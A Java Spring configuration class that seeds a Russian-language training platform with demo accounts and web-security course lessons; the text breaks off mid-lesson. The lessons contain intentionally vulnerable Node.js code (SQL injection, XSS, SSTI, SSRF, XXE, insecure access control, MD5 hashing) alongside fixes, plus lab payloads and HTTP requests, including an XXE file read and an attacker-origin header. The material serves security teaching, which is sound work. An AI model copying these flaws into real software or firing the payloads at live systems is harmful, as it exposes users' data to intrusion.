package ru.pep.platform.config;

import java.util.List;
import java.util.Map;
import java.util.function.Function;
import java.util.stream.Collectors;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.crypto.password.PasswordEncoder;
import ru.pep.platform.domain.AppUser;
import ru.pep.platform.domain.Course;
import ru.pep.platform.domain.CourseStatus;
import ru.pep.platform.domain.LearningModule;
import ru.pep.platform.domain.Lesson;
import ru.pep.platform.domain.ModuleStatus;
import ru.pep.platform.domain.Role;
import ru.pep.platform.repository.AppUserRepository;
import ru.pep.platform.repository.CourseRepository;
import ru.pep.platform.repository.LearningModuleRepository;
import ru.pep.platform.repository.LessonRepository;

@Configuration
@ConditionalOnProperty(prefix = "pep.demo-data", name = "enabled", havingValue = "true")
public class DemoDataInitializer {

    @Bean
    CommandLineRunner seedDemoData(
            AppUserRepository users,
            CourseRepository courses,
            LearningModuleRepository modules,
            LessonRepository lessons,
            PasswordEncoder passwordEncoder) {
        return args -> {
            createUser(users, passwordEncoder, "admin@pep.local", "admin", "Администратор", Role.ADMIN);
            createUser(users, passwordEncoder, "curator@pep.local", "curator", "Куратор", Role.CURATOR);
            createUser(users, passwordEncoder, "student1@pep.local", "student", "Студент 1", Role.STUDENT);
            createUser(users, passwordEncoder, "student2@pep.local", "student", "Студент 2", Role.STUDENT);

            LearningModule dockerModule = ensureModule(
                    courses,
                    modules,
                    "Вводный курс по Docker",
                    "Базовый курс по контейнерам, Dockerfile, Docker Compose и публикации image.",
                    "Docker intro",
                    "Docker basics");
            seedDockerLessons(lessons, dockerModule);

            archiveLegacySecurityCourses(courses);
            seedSecurityAcademyModules(courses, modules, lessons);
        };
    }

    private void archiveLegacySecurityCourses(CourseRepository courses) {
        List.of("OWASP Top 10", "Web Security Academy").forEach(title ->
                courses.findByTitle(title).ifPresent(course -> {
                    course.archive();
                    courses.save(course);
                }));
    }

    private void seedSecurityAcademyModules(
            CourseRepository courses,
            LearningModuleRepository modules,
            LessonRepository lessons) {
        List<SecurityModuleSeed> securityModules = List.of(
                new SecurityModuleSeed(
                        "SQL-инъекции",
                        "Инъекции в запросы к базе данных",
                        "Пользовательский ввод становится частью команды к базе данных, меняет условие выборки, раскрывает данные или обходит проверку входа.",
                        "формы входа, поиск, фильтры, сортировка, параметры идентификаторов и административные отчеты",
                        """
                                app.post('/login', async (req, res) => {
                                  const sql = "SELECT id, email FROM users WHERE email = '" + req.body.email +
                                    "' AND password = '" + req.body.password + "'";
                                  const user = await db.get(sql);
                                  if (!user) return res.status(403).send('Неверные данные');
                                  res.json({ id: user.id, email: user.email });
                                });
                                """,
                        "Ввод вставляется в текст запроса. Значение `' OR '1'='1` закрывает строку и добавляет истинное условие.",
                        """
                                app.post('/login', async (req, res) => {
                                  const user = await db.get(
                                    'SELECT id, email, password_hash FROM users WHERE email = ?',
                                    [req.body.email]
                                  );
                                  if (!user || !await verifyPassword(req.body.password, user.password_hash)) {
                                    return res.status(403).send('Неверные данные');
                                  }
                                  res.json({ id: user.id, email: user.email });
                                });
                                """,
                        "параметризованные запросы, белые списки для сортировки, отдельная проверка пароля, нейтральные ошибки",
                        "' OR '1'='1, ' AND '1'='2, UNION SELECT для учебных данных, проверка задержек только в локальном стенде"),
                new SecurityModuleSeed(
                        "Межсайтовое выполнение сценариев",
                        "Внедрение сценариев в страницу",
                        "Приложение возвращает пользовательский ввод в страницу без контекстного кодирования, и браузер выполняет внедренный сценарий в контексте сайта.",
                        "поиск, комментарии, профиль, сообщения об ошибках, предпросмотр Markdown и параметры ссылки",
                        """
                                app.get('/search', (req, res) => {
                                  res.send(`<h1>Результаты для: ${req.query.q}</h1>`);
                                });
                                """,
                        "Параметр `q` попадает в HTML как разметка. Сценарий получает доступ к контексту браузера этого origin.",
                        """
                                import escapeHtml from 'escape-html';

                                app.get('/search', (req, res) => {
                                  res.send(`<h1>Результаты для: ${escapeHtml(req.query.q ?? '')}</h1>`);
                                });
                                """,
                        "контекстное кодирование, безопасные шаблонизаторы, политика защиты содержимого, запрет небезопасного HTML",
                        "<script>alert(1)</script>, <img src=x onerror=alert(1)>, проверка отраженных и сохраненных значений"),
                new SecurityModuleSeed(
                        "Инъекция в серверные шаблоны",
                        "Выполнение выражений шаблонизатора",
                        "Пользовательский ввод попадает в шаблон до обработки движком и превращается в выражение на стороне сервера.",
                        "письма, счета, генераторы страниц, предпросмотр шаблонов, персонализированные приветствия",
                        """
                                app.post('/preview', (req, res) => {
                                  const template = `Здравствуйте, ${req.body.name}`;
                                  res.send(renderTemplate(template, req.body));
                                });
                                """,
                        "Имя пользователя становится частью шаблона. Если движок поддерживает выражения, ввод может читать переменные или вызывать опасные объекты.",
                        """
                                app.post('/preview', (req, res) => {
                                  res.render('preview', { name: String(req.body.name ?? '') });
                                });
                                """,
                        "никогда не собирать шаблон из ввода, передавать ввод только как данные, ограничивать возможности движка",
                        "{{7*7}}, ${7*7}, #{7*7}, проверка отличий между текстом и вычисленным выражением"),
                new SecurityModuleSeed(
                        "Подделка серверных запросов",
                        "Сервер обращается к адресу из пользовательского ввода",
                        "Приложение делает сетевой запрос к адресу, который контролирует пользователь, и может обратиться к внутренним ресурсам.",
                        "предпросмотр ссылок, импорт изображений, проверка webhook, загрузка по адресу, генерация снимков страниц",
                        """
                                app.get('/preview', async (req, res) => {
                                  const response = await fetch(req.query.url);
                                  res.send(await response.text());
                                });
                                """,
                        "Сервер доверяет произвольному адресу. Запрос выполняется из внутренней сети приложения, а не из браузера пользователя.",
                        """
                                const allowedHosts = new Set(['docs.example.local', 'cdn.example.local']);

                                app.get('/preview', async (req, res) => {
                                  const url = new URL(req.query.url);
                                  if (url.protocol !== 'https:' || !allowedHosts.has(url.hostname)) {
                                    return res.status(400).send('Адрес не разрешен');
                                  }
                                  const response = await fetch(url, { redirect: 'manual' });
                                  res.send(await response.text());
                                });
                                """,
                        "белый список узлов, запрет внутренних адресов, запрет перенаправлений, сетевые ограничения исходящих запросов",
                        "локальные адреса, адреса метаданных, перенаправления, разные записи IPv4 и доменные имена"),
                new SecurityModuleSeed(
                        "Межсайтовая подделка запроса",
                        "Навязывание действия авторизованному пользователю",
                        "Браузер автоматически отправляет cookie, поэтому чужая страница может инициировать действие в приложении без согласия пользователя.",
                        "смена почты, смена пароля, создание ключа, перевод средств, изменение настроек",
                        """
                                app.post('/profile/email', requireLogin, async (req, res) => {
                                  await db.users.update(req.user.id, { email: req.body.email });
                                  res.json({ ok: true });
                                });
                                """,
                        "Endpoint меняет состояние и доверяет только cookie. У запроса нет одноразового токена и проверки происхождения.",
                        """
                                app.post('/profile/email', requireLogin, csrfProtection, async (req, res) => {
                                  await db.users.update(req.user.id, { email: req.body.email });
                                  res.json({ ok: true });
                                });
                                """,
                        "одноразовые токены, SameSite cookie, проверка происхождения запроса, повторная проверка важных действий",
                        "HTML-форма с автоматической отправкой, отсутствие токена, проверка SameSite и заголовка происхождения"),
                new SecurityModuleSeed(
                        "Ошибки настройки CORS",
                        "Неправильное доверие другому источнику",
                        "Сервер разрешает чужому источнику читать ответы, которые должны быть доступны только текущему сайту.",
                        "личный профиль, настройки, токены, административные ответы, ответы с cookie",
                        """
                                app.use((req, res, next) => {
                                  const origin = req.headers.origin;
                                  if (origin) {
                                    res.setHeader('Access-Control-Allow-Origin', origin);
                                    res.setHeader('Access-Control-Allow-Credentials', 'true');
                                  }
                                  next();
                                });
                                """,
                        "Любой источник отражается как доверенный. Вместе с учетными данными это разрешает чтение личных ответов чужой страницей.",
                        """
                                const allowedOrigins = new Set(['https://academy.local', 'https://teacher.local']);

                                app.use((req, res, next) => {
                                  const origin = req.headers.origin;
                                  if (origin && allowedOrigins.has(origin)) {
                                    res.setHeader('Access-Control-Allow-Origin', origin);
                                    res.setHeader('Access-Control-Allow-Credentials', 'true');
                                    res.setHeader('Vary', 'Origin');
                                  }
                                  next();
                                });
                                """,
                        "точный белый список источников, запрет отражения Origin, разделение публичных и личных ответов",
                        "Origin: https://attacker.local, Origin: null, похожие поддомены, чтение ответа с учетными данными"),
                new SecurityModuleSeed(
                        "Внешние сущности XML",
                        "Небезопасная обработка XML",
                        "XML-разборщик разрешает внешние сущности и может читать локальные файлы или выполнять сетевые обращения от имени сервера.",
                        "загрузка XML, импорт офисных документов, SOAP, SVG, старые интеграции",
                        """
                                app.post('/import', express.text({ type: 'application/xml' }), async (req, res) => {
                                  const parser = new DOMParser({ resolveExternalEntities: true });
                                  const doc = parser.parseFromString(req.body, 'text/xml');
                                  res.send(doc.getElementsByTagName('name')[0].textContent);
                                });
                                """,
                        "Разборщик доверяет DTD и внешним сущностям. XML-документ может попросить сервер прочитать файл или URL.",
                        """
                                app.post('/import', express.text({ type: 'application/xml' }), async (req, res) => {
                                  const parser = new DOMParser({
                                    resolveExternalEntities: false,
                                    disallowDoctype: true
                                  });
                                  const doc = parser.parseFromString(req.body, 'text/xml');
                                  res.send(doc.getElementsByTagName('name')[0].textContent);
                                });
                                """,
                        "запрет DTD, запрет внешних сущностей, ограничение размера XML, безопасные библиотеки разбора",
                        "<!DOCTYPE>, внешняя сущность file, внешняя сущность http, проверка ошибок разбора"),
                new SecurityModuleSeed(
                        "Уязвимости бизнес-логики",
                        "Обход правил процесса",
                        "Код технически работает, но сервер не проверяет бизнес-инварианты: порядок шагов, лимиты, владельца действия или допустимый переход состояния.",
                        "корзина, купоны, платежи, обучение, выдача заданий, смена статусов",
                        """
                                app.post('/coupon/apply', requireLogin, async (req, res) => {
                                  const cart = await db.carts.current(req.user.id);
                                  cart.total = cart.total - Number(req.body.discount);
                                  await db.carts.save(cart);
                                  res.json(cart);
                                });
                                """,
                        "Клиент сам задает скидку. Сервер не проверяет существование купона, лимит применения и минимальную сумму.",
                        """
                                app.post('/coupon/apply', requireLogin, async (req, res) => {
                                  const coupon = await db.coupons.findActive(req.body.code);
                                  const cart = await db.carts.current(req.user.id);
                                  if (!coupon || cart.total < coupon.minTotal || await usedBefore(req.user.id, coupon.id)) {
                                    return res.status(400).send('Купон недоступен');
                                  }
                                  cart.total = Math.max(0, cart.total - coupon.discount);
                                  await db.carts.save(cart);
                                  res.json(cart);
                                });
                                """,
                        "серверные инварианты, атомарные операции, проверка переходов состояния, идемпотентность",
                        "повтор действия, пропуск шага, отрицательные значения, гонки, изменение статуса вне процесса"),
                new SecurityModuleSeed(
                        "Нарушение управления доступом",
                        "Отсутствие проверки прав",
                        "Приложение проверяет вход пользователя, но не проверяет, имеет ли он право выполнять конкретное действие.",
                        "административные методы, смена роли, просмотр отчетов, операции куратора, экспорт данных",
                        """
                                app.post('/admin/users/:id/role', requireLogin, async (req, res) => {
                                  await db.users.update(req.params.id, { role: req.body.role });
                                  res.json({ ok: true });
                                });
                                """,
                        "Есть только проверка входа. Любой пользователь может вызвать административное действие напрямую.",
                        """
                                app.post('/admin/users/:id/role', requireLogin, requireRole('ADMIN'), async (req, res) => {
                                  await db.users.update(req.params.id, { role: req.body.role });
                                  res.json({ ok: true });
                                });
                                """,
                        "проверка роли на сервере, запрет по умолчанию, политики на уровне объекта и действия",
                        "прямой вызов скрытых маршрутов, смена метода, изменение роли в запросе, проверка ответа 403"),
                new SecurityModuleSeed(
                        "Небезопасные прямые ссылки на объекты",
                        "Доступ к чужому объекту по идентификатору",
                        "Пользователь меняет идентификатор объекта и получает данные или действие, принадлежащее другому пользователю.",
                        "заказы, отчеты, файлы, профили, вложения, лабораторные стенды",
                        """
                                app.get('/api/reports/:id', requireLogin, async (req, res) => {
                                  const report = await db.reports.findById(req.params.id);
                                  res.json(report);
                                });
                                """,
                        "Сервер проверяет вход, но не сравнивает владельца отчета с текущим пользователем.",
                        """
                                app.get('/api/reports/:id', requireLogin, async (req, res) => {
                                  const report = await db.reports.findById(req.params.id);
                                  if (!report || report.authorId !== req.user.id) {
                                    return res.status(404).send('Отчет не найден');
                                  }
                                  res.json(report);
                                });
                                """,
                        "проверка владельца объекта, непрямые идентификаторы, одинаковая ошибка для чужого и несуществующего объекта",
                        "изменение id, перебор соседних id, прямой доступ к файлу, проверка чужих вложений"));

        for (SecurityModuleSeed seed : securityModules) {
            LearningModule module = ensureModule(
                    courses,
                    modules,
                    "Академия веб-безопасности",
                    "Подробный русскоязычный курс по практической эксплуатации и защите web-уязвимостей.",
                    seed.title(),
                    seed.topic());
            upsertLesson(lessons, module, 1, seed.title() + ": полный разбор", securityLesson(seed));
        }
    }

    private String securityLesson(SecurityModuleSeed seed) {
        return """
                ## Цель модуля

                Этот материал помогает понять уязвимость `%s` на уровне модели угроз, кода, признаков в интерфейсе
                и безопасного исправления. Студент создает локальный стенд, доказывает проблему белым ящиком и затем
                проверяет чужие стенды черным ящиком.

                ## Краткое определение

                %s

                ## Где искать уязвимость

                Чаще всего проблема встречается в таких местах: %s. Не ограничивайтесь видимыми кнопками в интерфейсе:
                проверяйте реальные HTTP-запросы, параметры, заголовки, тело запроса, cookie, перенаправления и
                ответы сервера. Если действие меняет данные, раскрывает сведения или обращается к внешнему ресурсу,
                оно должно иметь явную проверку на сервере.

                ## Модель угроз

                1. Определите актив: учетная запись, отчет, заказ, токен, файл, лабораторный стенд или внутренняя сеть.
                2. Найдите границу доверия: браузер, сервер, база данных, шаблонизатор, XML-разборщик или сетевой клиент.
                3. Найдите источник ввода: путь, query-параметр, тело запроса, заголовок, cookie, загруженный файл.
                4. Проверьте, может ли пользователь изменить поведение сервера, обойти право или прочитать лишние данные.
                5. Оцените влияние: конфиденциальность, целостность, доступность, обход процесса, расширение прав.

                ## Уязвимый пример кода

                ```javascript
                %s
                ```

                ## Разбор примера

                %s Суть проблемы не в конкретном языке, а в нарушении инварианта: данные из недоверенного источника
                используются как доверенные. В отчете важно показать не только полезную нагрузку, но и строку кода,
                где теряется граница доверия.

                ## Признаки при проверке черным ящиком

                - разные ответы на похожие запросы;
                - изменение статуса, тела ответа или времени ответа при изменении одного параметра;
                - доступ к объекту, который не должен принадлежать текущему пользователю;
                - выполнение действия без подтверждения или без нужной роли;
                - появление в ответе данных, которые пришли из пользовательского ввода;
                - сервер делает запрос, рендерит шаблон или разбирает XML по данным пользователя.

                ## Методика ручной проверки

                Начните с безопасной базовой проверки. Сохраните исходный запрос, измените только один параметр,
                сравните результат и повторите проверку на другом объекте или другом пользователе. Не используйте
                разрушительные действия, не меняйте реальные данные и не выходите за границы назначенного стенда.

                ```text
                1. Выполните обычное действие в приложении.
                2. Повторите запрос с измененным параметром.
                3. Сравните статус ответа, тело ответа и побочные эффекты.
                4. Зафиксируйте минимальное доказательство.
                5. Опишите, какая проверка отсутствует на сервере.
                ```

                ## Полезные нагрузки для лаборатории

                ```text
                %s
                ```

                Эти значения предназначены только для учебного стенда. В реальной системе используйте минимальные
                безопасные проверки и согласованный объем тестирования.

                ## Разновидности уязвимости

                %s

                ## Методика эксплуатации в учебном стенде

                %s

                ## Инструменты для практики

                %s

                ## Примеры HTTP-запросов

                ```http
                %s
                ```

                ## Типовые ошибки при исправлении

                - исправление только на стороне интерфейса без серверной проверки;
                - фильтрация одной строки вместо защиты конкретного контекста;
                - разные сообщения для чужого и несуществующего объекта;
                - отсутствие негативного теста после исправления;
                - логирование секретов или полезной нагрузки без маскирования;
                - доверие заголовкам и параметрам, которые полностью контролирует пользователь.

                ## Матрица проверки

                | Проверка | Что подтвердить |
                | --- | --- |
                | Обычный запрос | Приложение работает в штатном сценарии |
                | Измененный параметр | Видно отличие ответа или состояния |
                | Чужой пользователь | Действие не должно быть доступно без права |
                | Повтор запроса | Нет обхода через повтор или гонку |
                | Исправленная версия | Тот же сценарий больше не воспроизводится |

                ## Безопасное исправление

                ```javascript
                %s
                ```

                ## Почему исправление работает

                Исправление должно устранять корень проблемы, а не маскировать симптом. Например, скрытая кнопка
                во фронтенде не является контролем доступа, а фильтрация одной строки не заменяет контекстную защиту.

                ## Защитные меры

                - %s;
                - централизованная проверка прав и инвариантов на сервере;
                - безопасные настройки библиотек и фреймворков по умолчанию;
                - журналирование отказов доступа и подозрительных запросов без записи секретов;
                - негативные тесты на каждую найденную уязвимость;
                - минимизация данных в ответе и единые нейтральные сообщения об ошибках.

                ## Задание для белого ящика

                Создайте уязвимый стенд с одним основным endpoint по теме `%s`. В отчете покажите фрагмент кода,
                обычный запрос, измененный запрос, результат, влияние и исправленную версию. Приложение должно
                запускаться из Docker-архива, отвечать на `/health` и содержать только учебные данные.

                ## Задание для черного ящика

                Получите назначенный стенд другого студента. Найдите точку входа, выполните минимальную проверку,
                оформите доказательство и предложите исправление. Если гипотеза не подтвердилась, укажите это отдельно
                и не выдавайте ее за находку.

                ## Чек-лист отчета

                - название уязвимости и краткое влияние;
                - endpoint и метод запроса;
                - исходный запрос и измененный запрос;
                - наблюдаемый результат;
                - уязвимый фрагмент кода или объяснение поведения;
                - безопасное исправление;
                - негативный тест, который должен пройти после исправления.
                """.formatted(
                seed.title(),
                seed.definition(),
                seed.searchAreas(),
                seed.vulnerableCode(),
                seed.codeExplanation(),
                seed.payloads(),
                variantGuide(seed.title()),
                exploitationGuide(seed.title()),
                toolsGuide(seed.title()),
                httpExample(seed.title()),
                seed.safeCode(),
                seed.defense(),
                seed.title());
    }

    private String variantGuide(String title) {
        if (title.contains("SQL")) {
            return """
                    - логическая инъекция: проверка истинных и ложных условий;
                    - инъекция через объединение выборок: контролируемое добавление учебных строк в результат;
                    - инъекция в сортировку: подмена имени поля, когда разработчик не использует белый список;
                    - слепая инъекция: вывод не меняется явно, но меняется время ответа или косвенный признак;
                    - инъекция второго порядка: значение сохраняется, а выполняется позже в другом запросе.
                    """;
        }
        if (title.contains("сценариев")) {
            return """
                    - отраженная уязвимость: значение сразу возвращается в ответе;
                    - сохраненная уязвимость: значение сохраняется и отображается другим пользователям;
                    - уязвимость в структуре документа: ввод попадает в атрибут, ссылку или сценарий;
                    - уязвимость на стороне клиента: опасная обработка fragment, postMessage или данных из адреса;
                    - обход фильтра: смена контекста, кодировки или события элемента.
                    """;
        }
        if (title.contains("шаблоны")) {
            return """
                    - простое вычисление выражений;
                    - чтение переменных шаблона;
                    - обращение к объектам окружения шаблонизатора;
                    - обход фильтров через альтернативный синтаксис;
                    - смешение пользовательского шаблона и пользовательских данных.
                    """;
        }
        if (title.contains("серверных запросов")) {
            return """
                    - обращение к внутреннему адресу;
                    - обход через перенаправление;
                    - обход через альтернативную запись адреса;
                    - обращение к служебным метаданным;
                    - использование доверенного домена, который сам перенаправляет запрос.
                    """;
        }
        if (title.contains("подделка запроса")) {
            return """
                    - простая отправка формы с другого сайта;
                    - запрос с учетными данными браузера;
                    - обход через небезопасный метод GET;
                    - слабый или переиспользуемый токен;
                    - отсутствие проверки источника запроса.
                    """;
        }
        if (title.contains("CORS")) {
            return """
                    - отражение любого источника;
                    - доверие `null`-источнику;
                    - слишком широкий шаблон поддоменов;
                    - разрешение учетных данных для личных ответов;
                    - отсутствие заголовка `Vary: Origin` и смешивание кеша.
                    """;
        }
        if (title.contains("XML")) {
            return """
                    - внешняя сущность для чтения файла;
                    - внешняя сущность для сетевого запроса;
                    - раскрытие ошибки разборщика;
                    - атака через вложенный формат, который внутри содержит XML;
                    - чрезмерно большой XML, перегружающий разборщик.
                    """;
        }
        if (title.contains("бизнес")) {
            return """
                    - обход порядка шагов;
                    - повтор одноразового действия;
                    - отрицательные или слишком большие значения;
                    - гонка между двумя запросами;
                    - доверие цене, скидке, роли или статусу из клиента.
                    """;
        }
        if (title.contains("управления доступом")) {
            return """
                    - доступ к административному маршруту без роли;
                    - смена метода запроса;
                    - изменение роли или владельца в теле запроса;
                    - скрытая кнопка без серверной проверки;
                    - доступ к функции через прямой URL.
                    """;
        }
        return """
                - изменение идентификатора объекта;
                - перебор соседних идентификаторов;
                - доступ к чужому файлу;
                - доступ к объекту после смены пользователя;
                - различие ответа для чужого и несуществующего объекта.
                """;
    }

    private String exploitationGuide(String title) {
        return """
                1. Подготовьте два учебных пользователя и минимальный набор данных.
                2. Выполните штатный запрос и сохраните метод, путь, параметры, тело и важные заголовки.
                3. Измените только один элемент: параметр, идентификатор, источник, тело XML или значение формы.
                4. Сравните ответ: статус, тело, время, перенаправление, запись в базе или изменение состояния.
                5. Повторите проверку от имени второго пользователя, чтобы отделить ошибку доступа от ошибки валидации.
                6. Зафиксируйте минимальное доказательство без реальных секретов.
                7. Внесите исправление и выполните тот же запрос повторно как негативный тест.
                """;
    }

    private String toolsGuide(String title) {
        return """
                - встроенные инструменты разработчика браузера для просмотра запросов;
                - перехватывающий прокси для повторения и изменения HTTP-запросов;
                - `curl` или HTTP-клиент для точного воспроизведения запроса;
                - локальные журналы приложения и контейнера для подтверждения серверного поведения;
                - unit/integration-тесты, которые фиксируют исправление.
                """;
    }

    private String httpExample(String title) {
        if (title.contains("SQL")) {
            return "POST /login HTTP/1.1\\nContent-Type: application/json\\n\\n{\\\"email\\\":\\\"' OR '1'='1\\\",\\\"password\\\":\\\"test\\\"}";
        }
        if (title.contains("сценариев")) {
            return "GET /search?q=<img src=x onerror=alert(1)> HTTP/1.1\\nHost: lab.local";
        }
        if (title.contains("серверных запросов")) {
            return "GET /preview?url=http://127.0.0.1:8080/internal HTTP/1.1\\nHost: lab.local";
        }
        if (title.contains("подделка запроса")) {
            return "POST /profile/email HTTP/1.1\\nContent-Type: application/x-www-form-urlencoded\\n\\nemail=attacker@example.local";
        }
        if (title.contains("CORS")) {
            return "GET /api/me HTTP/1.1\\nHost: lab.local\\nOrigin: https://attacker.local";
        }
        if (title.contains("XML")) {
            return "POST /import HTTP/1.1\\nContent-Type: application/xml\\n\\n<!DOCTYPE x [<!ENTITY e SYSTEM \\\"file:///etc/hostname\\\">]><x>&e;</x>";
        }
        if (title.contains("управления доступом")) {
            return "POST /admin/users/42/role HTTP/1.1\\nContent-Type: application/json\\n\\n{\\\"role\\\":\\\"ADMIN\\\"}";
        }
        return "GET /api/reports/2 HTTP/1.1\\nCookie: session=student-one";
    }

    private void seedOwaspTop10Modules(
            CourseRepository courses,
            LearningModuleRepository modules,
            LessonRepository lessons) {
        List<OwaspModuleSeed> owaspModules = List.of(
                new OwaspModuleSeed(
                        "A01. Broken Access Control",
                        "Broken Access Control",
                        "ошибки проверки владельца объекта, IDOR и обход ролей",
                        "создайте приложение, где пользователь может получить чужую запись по предсказуемому ID",
                        "проверьте прямой доступ к чужим объектам, изменение ID в URL и отсутствие role checks",
                        """
                                app.get('/api/orders/:id', requireLogin, async (req, res) => {
                                  const order = await db.orders.findById(req.params.id);
                                  res.json(order);
                                });
                                """,
                        "Код проверяет только факт входа, но не проверяет, что заказ принадлежит текущему пользователю.",
                        "Сравнивайте `order.userId` с `req.user.id`, а для ролей используйте server-side authorization policy."),
                new OwaspModuleSeed(
                        "A02. Cryptographic Failures",
                        "Cryptographic Failures",
                        "небезопасное хранение секретов, слабое хеширование и отсутствие защиты чувствительных данных",
                        "создайте приложение, где секрет хранится открыто или пароль хешируется слабым алгоритмом",
                        "ищите утечки секретов, слабые reset flows и данные, передаваемые без должной защиты",
                        """
                                const passwordHash = crypto
                                  .createHash('md5')
                                  .update(req.body.password)
                                  .digest('hex');
                                await db.users.insert({ email, passwordHash, cardNumber: req.body.cardNumber });
                                """,
                        "MD5 быстро перебирается, а чувствительный номер карты сохраняется без шифрования и минимизации.",
                        "Используйте Argon2/bcrypt для паролей, не храните лишние PAN/секреты, шифруйте необходимые поля."),
                new OwaspModuleSeed(
                        "A04. Insecure Design",
                        "Insecure Design",
                        "ошибки бизнес-логики и workflow, которые не исправляются одной input validation",
                        "создайте сценарий обхода лимита, статуса заказа или обязательного шага процесса",
                        "проверьте пропуск шагов workflow, повтор операций и изменение состояния не по правилам",
                        """
                                app.post('/api/coupon/apply', requireLogin, async (req, res) => {
                                  const cart = await db.carts.current(req.user.id);
                                  cart.total = cart.total - Number(req.body.discount);
                                  await db.carts.save(cart);
                                  res.json(cart);
                                });
                                """,
                        "Клиент сам задает размер скидки, а сервер не проверяет бизнес-правила купона.",
                        "Храните правила скидок на сервере, проверяйте ownership, статус, лимиты применения и идемпотентность."),
                new OwaspModuleSeed(
                        "A05. Security Misconfiguration",
                        "Security Misconfiguration",
                        "debug endpoints, default credentials, лишние headers и открытые админские функции",
                        "создайте приложение с включенным debug endpoint или тестовыми учетными данными",
                        "ищите default credentials, debug output, stack traces и открытые actuator/admin paths",
                        """
                                app.get('/debug/config', (req, res) => {
                                  res.json(process.env);
                                });

                                app.use((error, req, res, next) => {
                                  res.status(500).send(error.stack);
                                });
                                """,
                        "Endpoint раскрывает секреты окружения, а обработчик ошибок возвращает stack trace пользователю.",
                        "Отключайте debug в production, фильтруйте секреты, возвращайте нейтральные ошибки и настройте headers."),
                new OwaspModuleSeed(
                        "A06. Vulnerable and Outdated Components",
                        "Vulnerable Components",
                        "риски устаревших библиотек, frameworks и container base images",
                        "создайте учебный пример с устаревшей зависимостью и опишите публичное CVE",
                        "проверьте версии библиотек, package metadata, headers и признаки устаревшего framework",
                        """
                                // package.json
                                {
                                  "dependencies": {
                                    "lodash": "4.17.11",
                                    "express": "4.16.0"
                                  }
                                }
                                """,
                        "Приложение зависит от старых версий библиотек с публично известными уязвимостями.",
                        "Фиксируйте SCA-процесс, обновляйте зависимости, используйте lockfile, SBOM и image scanning."),
                new OwaspModuleSeed(
                        "A07. Identification and Authentication Failures",
                        "Authentication Failures",
                        "слабые пароли, predictable reset tokens и небезопасные session settings",
                        "создайте reset token, который можно предсказать или перебрать в учебном scope",
                        "проверьте reset flows, session fixation, weak password policy и predictable tokens",
                        """
                                app.post('/reset/start', async (req, res) => {
                                  const token = String(Math.floor(Math.random() * 1000000));
                                  await db.resetTokens.save({ email: req.body.email, token });
                                  res.json({ resetToken: token });
                                });
                                """,
                        "Токен короткий, предсказуемый и возвращается клиенту; перебор занимает мало времени.",
                        "Используйте криптографически стойкие токены, TTL, rate limiting, audit и не раскрывайте token в ответе."),
                new OwaspModuleSeed(
                        "A08. Software and Data Integrity Failures",
                        "Integrity Failures",
                        "доверие к неподписанным данным, insecure deserialization и небезопасные update flows",
                        "создайте endpoint, который доверяет неподписанному JSON/cookie payload",
                        "проверьте подмену client-side данных, unsigned tokens и отсутствие integrity checks",
                        """
                                app.use((req, res, next) => {
                                  const profile = JSON.parse(Buffer.from(req.cookies.profile, 'base64').toString());
                                  req.user = profile;
                                  next();
                                });
                                """,
                        "Сервер доверяет неподписанной cookie, поэтому пользователь может подменить роль или идентификатор.",
                        "Подписывайте и проверяйте целостность данных, а роли и права загружайте с сервера."),
                new OwaspModuleSeed(
                        "A09. Security Logging and Monitoring Failures",
                        "Logging and Monitoring Failures",
                        "отсутствие событий безопасности, audit trail и сигналов для обнаружения атак",
                        "создайте сценарий атаки, который проходит без полезной записи в логах",
                        "проверьте, фиксируются ли login failures, access denied, report actions и подозрительные payloads",
                        """
                                app.post('/login', async (req, res) => {
                                  const user = await authenticate(req.body.email, req.body.password);
                                  if (!user) return res.status(403).json({ error: 'bad credentials' });
                                  res.json({ ok: true });
                                });
                                """,
                        "Отказ входа не пишет security event, поэтому brute force и credential stuffing незаметны.",
                        "Логируйте auth failures, access denied, изменения прав и подозрительные payloads без записи паролей."),
                new OwaspModuleSeed(
                        "A10. Server-Side Request Forgery",
                        "SSRF",
                        "серверные запросы к URL, controlled by user, и риск доступа к internal resources",
                        "создайте безопасный учебный SSRF endpoint с allowlisted локальной целью",
                        "проверьте URL fetch endpoints, redirects, private IP ranges и bypass allowlist",
                        """
                                app.get('/preview', async (req, res) => {
                                  const response = await fetch(req.query.url);
                                  res.send(await response.text());
                                });
                                """,
                        "Сервер делает запрос к произвольному URL и может обратиться к internal metadata или private network.",
                        "Используйте allowlist hostnames, запрет private IP ranges, запрет redirects и egress controls."));

        for (OwaspModuleSeed seed : owaspModules) {
            LearningModule module = ensureModule(
                    courses,
                    modules,
                    "OWASP Top 10",
                    "Практический курс по базовым классам web-уязвимостей.",
                    seed.title(),
                    seed.topic());
            seedGenericOwaspLessons(lessons, module, seed);
        }
    }

    private void seedWebSecurityAcademyModules(
            CourseRepository courses,
            LearningModuleRepository modules,
            LessonRepository lessons) {
        LearningModule corsModule = ensureModule(
                courses,
                modules,
                "Web Security Academy",
                "Длинные практические материалы в стиле PortSwigger: одна страница, много разделов и якорные ссылки.",
                "CORS",
                "CORS misconfiguration");
        upsertLesson(lessons, corsModule, 1,
                "CORS: подробный разбор уязвимостей",
                """
                        ## What is CORS

                        CORS, или Cross-Origin Resource Sharing, определяет, может ли браузер разрешить JavaScript
                        с одного origin читать ответ другого origin. Same-Origin Policy по умолчанию запрещает чтение
                        чужих ответов, но сервер может ослабить это правило с помощью HTTP-заголовков.

                        ## Origin и trust boundary

                        Origin состоит из схемы, host и port. `https://academy.example`, `http://academy.example`
                        и `https://academy.example:8443` - разные origins. Когда backend возвращает
                        `Access-Control-Allow-Origin`, он фактически говорит браузеру, каким сайтам можно читать
                        ответ из JavaScript.

                        ## Typical vulnerable code

                        ```javascript
                        app.use((req, res, next) => {
                          const origin = req.headers.origin;
                          if (origin) {
                            res.setHeader('Access-Control-Allow-Origin', origin);
                            res.setHeader('Access-Control-Allow-Credentials', 'true');
                          }
                          next();
                        });

                        app.get('/api/me', requireLogin, async (req, res) => {
                          res.json({
                            email: req.user.email,
                            apiToken: req.user.apiToken
                          });
                        });
                        ```

                        ## Code walkthrough

                        Первая проблема - сервер отражает любой `Origin` обратно в
                        `Access-Control-Allow-Origin`. Вторая проблема - вместе с этим включен
                        `Access-Control-Allow-Credentials: true`, поэтому браузер может отправить cookie пользователя
                        и разрешить чужому сайту прочитать чувствительный JSON-ответ.

                        ## Exploitation idea

